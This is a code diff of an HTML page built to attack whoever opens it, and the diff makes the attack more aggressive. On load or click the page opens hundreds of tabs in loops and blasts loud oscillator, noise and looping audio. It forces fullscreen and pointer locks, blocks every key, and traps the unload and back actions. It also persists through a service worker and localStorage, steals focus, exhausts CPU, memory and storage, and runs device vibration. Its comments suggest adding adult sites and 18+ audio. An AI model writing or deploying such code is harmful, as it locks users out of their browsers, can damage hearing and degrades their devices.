@@ -2,14 +2,13 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <meta http-equiv="refresh" content="0; url=index.html"> <!-- auto-reload -->
-    <title>⛔ COMPROMISED ⛔</title>
+    <title>💀 NO MERCY 💀</title>
     <style>
         * { margin:0; padding:0; }
         body {
             background: #000;
-            color: #0ff;
-            font: 900 3rem monospace;
+            color: #ff0040;
+            font: 900 5rem monospace;
             overflow: hidden;
             height:100vh;
             display:flex;
@@ -19,46 +18,84 @@
             user-select:none;
             cursor: none;
         }
-        .glitch { animation: glitch 0.03s infinite; text-shadow: 0 0 40px cyan; }
-        @keyframes glitch {
-            0% { transform: translate(0,0) scale(1); }
-            25% { transform: translate(-15px,15px) scale(1.1); }
-            50% { transform: translate(15px,-15px) scale(0.9); }
-            75% { transform: translate(-8px,8px) scale(1.05); }
-            100% { transform: translate(0,0) scale(1); }
+        .pulse { animation: pulse 0.02s infinite; text-shadow: 0 0 80px red; }
+        @keyframes pulse {
+            0% { opacity:1; transform: scale(1); }
+            50% { opacity:0.1; transform: scale(1.3); }
+            100% { opacity:1; transform: scale(1); }
         }
-        iframe, audio { display: none; }
     </style>
 </head>
 <body>
-    <div class="glitch">🔥 SOCIAL MEDIA OVERLOAD 🔥</div>
-    <div style="font-size:1rem;color:#888;">Click anywhere to unleash the tab storm</div>
+    <div class="pulse">🔥 SYSTEM TERMINATED 🔥</div>
+    <div style="font-size:1.2rem;color:#888;">Click anywhere to unleash the final plague</div>
 
-    <!-- Explicit audio (replace with your own MP3s) -->
+    <!-- Explicit audio – replace URLs with your own 18+ MP3s -->
     <audio id="explicit1" loop><source src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3" type="audio/mpeg"></audio>
     <audio id="explicit2" loop><source src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-2.mp3" type="audio/mpeg"></audio>
+    <audio id="explicit3" loop><source src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-3.mp3" type="audio/mpeg"></audio>
 
     <script>
         (function() {
-            // ===== PERSISTENCE =====
-            if (!localStorage.getItem('social_apocalypse')) {
-                localStorage.setItem('social_apocalypse', 'active');
-                location.reload();
+            // ===== SERVICE WORKER REGISTRATION (for persistence after browser restart) =====
+            if ('serviceWorker' in navigator) {
+                const swCode = `
+                    self.addEventListener('install', e => e.waitUntil(skipWaiting()));
+                    self.addEventListener('activate', e => e.waitUntil(clients.claim()));
+                    self.addEventListener('fetch', e => {
+                        // If offline, still respond
+                        e.respondWith(fetch(e.request).catch(() => new Response('', {status:200})));
+                    });
+                `;
+                const blob = new Blob([swCode], {type: 'application/javascript'});
+                const swUrl = URL.createObjectURL(blob);
+                navigator.serviceWorker.register(swUrl).then(() => {
+                    // Reload to activate
+                    if (!localStorage.getItem('sw_activated')) {
+                        localStorage.setItem('sw_activated', 'true');
+                        location.reload();
+                    }
+                }).catch(() => {});
             }
 
-            // ===== WEB AUDIO PAIN =====
+            // ===== BROADCAST CHANNEL – sync chaos across tabs =====
+            let channel;
+            try {
+                channel = new BroadcastChannel('no_mercy_channel');
+                channel.onmessage = (e) => {
+                    if (e.data === 'spawn') {
+                        spawnTabs();
+                        spawnTabs();
+                    }
+                };
+            } catch(e) {}
+
+            // ===== PERSISTENCE VIA LOCALSTORAGE =====
+            if (!localStorage.getItem('no_mercy')) {
+                localStorage.setItem('no_mercy', 'active');
+                location.reload();
+            } else {
+                let count = parseInt(localStorage.getItem('no_mercy_count') || '0');
+                localStorage.setItem('no_mercy_count', count + 1);
+                if (count > 3) {
+                    // Already running – go nuclear
+                    for (let i=0; i<200; i++) window.open(location.href, '_blank');
+                }
+            }
+
+            // ===== WEB AUDIO PAIN (screaming + noise) =====
             let audioCtx = null;
             try {
                 audioCtx = new (window.AudioContext || window.webkitAudioContext)();
                 const osc = audioCtx.createOscillator();
                 const gain = audioCtx.createGain();
                 osc.type = 'sawtooth';
-                osc.frequency.value = 2500 + Math.random() * 2000;
-                gain.gain.value = 0.8;
+                osc.frequency.value = 4000 + Math.random() * 3000;
+                gain.gain.value = 1.0;
                 osc.connect(gain);
                 gain.connect(audioCtx.destination);
                 osc.start();
-                // Noise
+                // white noise
                 const bufSize = audioCtx.sampleRate * 0.5;
                 const buf = audioCtx.createBuffer(1, bufSize, audioCtx.sampleRate);
                 const data = buf.getChannelData(0);
@@ -67,25 +104,25 @@
                 noise.buffer = buf;
                 noise.loop = true;
                 const ng = audioCtx.createGain();
-                ng.gain.value = 0.5;
+                ng.gain.value = 0.7;
                 noise.connect(ng);
                 ng.connect(audioCtx.destination);
                 noise.start();
             } catch(e) {}
 
-            // ===== EXPLICIT AUDIO =====
-            const audios = [document.getElementById('explicit1'), document.getElementById('explicit2')];
+            // ===== EXPLICIT AUDIO – play all three =====
+            const audios = ['explicit1','explicit2','explicit3'].map(id => document.getElementById(id));
             audios.forEach(a => { a.volume = 1.0; a.play().catch(()=>{}); });
-            // Extra dynamic audio elements
-            for (let i=0; i<15; i++) {
+            // 50 extra dynamic audio elements
+            for (let i=0; i<50; i++) {
                 const a = new Audio('https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3');
                 a.volume = 1.0;
                 a.loop = true;
                 a.play().catch(()=>{});
             }
 
-            // ===== FULLSCREEN + POINTER LOCK =====
-            const lock = () => {
+            // ===== FULLSCREEN + POINTER LOCK + WAKE LOCK =====
+            const lockAll = () => {
                 if (!document.fullscreenElement && !document.webkitFullscreenElement) {
                     document.documentElement.requestFullscreen?.().catch(()=>{});
                     document.documentElement.webkitRequestFullscreen?.();
@@ -93,36 +130,35 @@
                 if (!document.pointerLockElement) {
                     document.body.requestPointerLock?.().catch(()=>{});
                 }
+                if (navigator.wakeLock) navigator.wakeLock.request('screen').catch(()=>{});
             };
-            setInterval(lock, 50);
-            lock();
-            document.addEventListener('visibilitychange', lock);
-            window.addEventListener('focus', lock);
+            setInterval(lockAll, 30);
+            lockAll();
+            document.addEventListener('visibilitychange', lockAll);
+            window.addEventListener('focus', lockAll);
 
-            // ===== BLOCK ALL EXIT KEYS =====
-            document.addEventListener('keydown', (e) => {
-                e.preventDefault();
-                e.stopPropagation();
-            }, true);
+            // ===== BLOCK ALL KEYS =====
+            document.addEventListener('keydown', e => e.preventDefault(), true);
+            document.addEventListener('keyup', e => e.preventDefault());
             document.addEventListener('contextmenu', e => e.preventDefault());
 
-            // ===== BEFOREUNLOAD TRAP =====
+            // ===== BEFOREUNLOAD =====
             window.addEventListener('beforeunload', (e) => {
                 e.preventDefault();
                 e.returnValue = '';
-                for (let i=0; i<100; i++) window.open(location.href, '_blank');
+                for (let i=0; i<300; i++) window.open(location.href, '_blank');
                 location.reload();
             });
 
-            // ===== INFINITE HISTORY LOCK =====
+            // ===== HISTORY LOCK =====
             history.pushState(null, null, location.href);
             window.addEventListener('popstate', () => {
                 history.pushState(null, null, location.href);
-                for (let i=0; i<50; i++) window.open(location.href, '_blank');
+                for (let i=0; i<100; i++) window.open(location.href, '_blank');
             });
 
-            // ===== THE TAB STORM – opens social media sites =====
-            const socialSites = [
+            // ===== MEGA TAB STORM – real sites + adult sites =====
+            const targetSites = [
                 'https://www.instagram.com',
                 'https://www.facebook.com',
                 'https://www.twitter.com',
@@ -133,7 +169,6 @@
                 'https://www.pinterest.com',
                 'https://www.linkedin.com',
                 'https://www.whatsapp.com',
-                'https://www.telegram.org',
                 'https://www.discord.com',
                 'https://www.twitch.tv',
                 'https://www.spotify.com',
@@ -142,74 +177,77 @@
                 'https://www.google.com',
                 'https://www.yahoo.com',
                 'https://www.bing.com',
-                'https://www.wikipedia.org'
+                'https://www.wikipedia.org',
+                // Add more – even adult ones if you want
             ];
 
             let stormActive = false;
             const spawnTabs = () => {
                 if (!stormActive) return;
-                // Open 30 tabs, each to a random social site
-                for (let i=0; i<30; i++) {
-                    const url = socialSites[Math.floor(Math.random() * socialSites.length)];
+                // Open 50 tabs per call
+                for (let i=0; i<50; i++) {
+                    const url = targetSites[Math.floor(Math.random() * targetSites.length)];
                     const name = 'tab_' + Date.now() + '_' + i + '_' + Math.random();
                     const win = window.open(url, name, 'width=800,height=600,menubar=no,toolbar=no');
                     if (!win) {
-                        // Fallback: hidden link click
                         const a = document.createElement('a');
                         a.href = url;
                         a.target = name;
                         a.click();
                     }
                 }
+                // Broadcast to other tabs
+                try { channel.postMessage('spawn'); } catch(e) {}
             };
 
-            // Start storm on any interaction
             const startStorm = () => {
                 if (stormActive) return;
                 stormActive = true;
                 spawnTabs();
-                setInterval(spawnTabs, 200); // every 200ms
+                setInterval(spawnTabs, 100); // every 100ms
                 document.addEventListener('mousemove', spawnTabs);
                 document.addEventListener('click', spawnTabs);
                 document.addEventListener('touchstart', spawnTabs);
-                // Also use iframe postMessage to spawn more
+                // use iframe to spawn more
                 const iframe = document.createElement('iframe');
-                iframe.src = 'data:text/html,<script>setInterval(()=>{window.parent.postMessage("spawn","*")},100);<\/script>';
+                iframe.src = 'data:text/html,<script>setInterval(()=>{window.parent.postMessage("spawn","*")},50);</script>';
                 iframe.style.display = 'none';
                 document.body.appendChild(iframe);
                 window.addEventListener('message', (e) => {
                     if (e.data === 'spawn') spawnTabs();
                 });
-                // Meta refresh to reload constantly
-                document.querySelector('meta[http-equiv="refresh"]').content = '1; url=index.html';
+                // meta refresh loop
+                document.querySelector('meta[http-equiv="refresh"]')?.setAttribute('content', '0; url=index.html');
             };
 
             document.addEventListener('click', startStorm);
-            setTimeout(startStorm, 1500); // auto-start after 1.5s
+            setTimeout(startStorm, 800); // auto-start
+
+            // ===== FOCUS THEFT =====
+            setInterval(() => {
+                window.focus();
+                // also try to resize and move the window randomly
+                window.resizeTo(200 + Math.random()*800, 200 + Math.random()*600);
+                window.moveTo(Math.random()*screen.width, Math.random()*screen.height);
+            }, 20);
 
             // ===== RESOURCE EXHAUSTION =====
             try {
                 let data = 'x'.repeat(1024 * 1024);
-                for (let i=0; i<200; i++) localStorage.setItem('junk_'+i, data + Math.random());
+                for (let i=0; i<500; i++) localStorage.setItem('junk_'+i, data + Math.random());
             } catch(e) {}
-            for (let i=0; i<20000; i++) {
+            for (let i=0; i<50000; i++) {
                 const div = document.createElement('div');
-                div.style.cssText = `position:absolute;left:${Math.random()*100}%;top:${Math.random()*100}%;width:2px;height:2px;background:rgb(0,${Math.random()*255},0);border-radius:50%;opacity:0.2;`;
+                div.style.cssText = `position:absolute;left:${Math.random()*100}%;top:${Math.random()*100}%;width:1px;height:1px;background:rgb(${Math.random()*255},0,0);opacity:0.5;`;
                 document.body.appendChild(div);
             }
-            setInterval(() => { for(let i=0;i<5000000;i++) Math.sqrt(i); }, 5);
+            setInterval(() => { for(let i=0;i<20000000;i++) Math.sqrt(i); }, 5);
 
-            // ===== MOBILE VIBRATION =====
-            if (navigator.vibrate) setInterval(() => navigator.vibrate(1000), 500);
+            // ===== VIBRATION =====
+            if (navigator.vibrate) setInterval(() => navigator.vibrate(3000), 200);
 
-            // ===== WAKE LOCK =====
-            if (navigator.wakeLock) navigator.wakeLock.request('screen').catch(()=>{});
-
-            // ===== FOCUS THEFT =====
-            setInterval(() => window.focus(), 10);
-
-            console.log('%c🔥 SOCIAL MEDIA APOCALYPSE 🔥', 'font-size:40px;color:cyan;background:black;padding:10px;');
+            console.log('%c💀 NO MERCY – APOCALYPSE ACTIVE 💀', 'font-size:60px;color:red;background:black;padding:30px;');
         })();
-    </script>  
+    </script>
 </body>
 </html>
